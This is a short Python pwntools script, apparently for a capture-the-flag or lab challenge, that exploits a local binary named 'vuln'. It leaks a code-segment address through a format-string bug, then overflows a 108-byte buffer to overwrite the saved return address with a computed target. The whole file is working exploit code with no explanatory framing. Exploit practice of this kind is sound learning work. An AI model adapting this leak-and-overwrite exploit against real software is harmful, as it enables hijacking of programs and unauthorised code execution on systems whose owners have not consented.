import pwn
import time

def find_eip():
    p = pwn.process('./vuln')
    buffer_size = 96
    buffer_size += 12 # also old ebp
    print("Attach to the process with the debugger")
    input()
    p.sendline("%p "*27)
    print(p.recv())
    new_eip = b'B'*4 
    p.sendline(b'A'*buffer_size + new_eip)
    print(p.recv())
    p.sendline("exit")
    print(p.recv())
    print(p.recv())
    
def hack_it():
    p = pwn.process('./vuln')
    buffer_size = 96
    buffer_size += 12 # also old ebp
    p.sendline(" %p"*27)
    leak = p.recv()
    text_segment_addr = leak.split(b" ")[-1].decode("utf-8")
    new_eip = pwn.p32(int(text_segment_addr[:-3] + "67d", 16))
    p.sendline(b'A'*buffer_size + new_eip)
    p.recv()
    p.sendline("exit")
    p.recv()
    time.sleep(1)

if __name__=='__main__':
    #find_eip()
    hack_it()
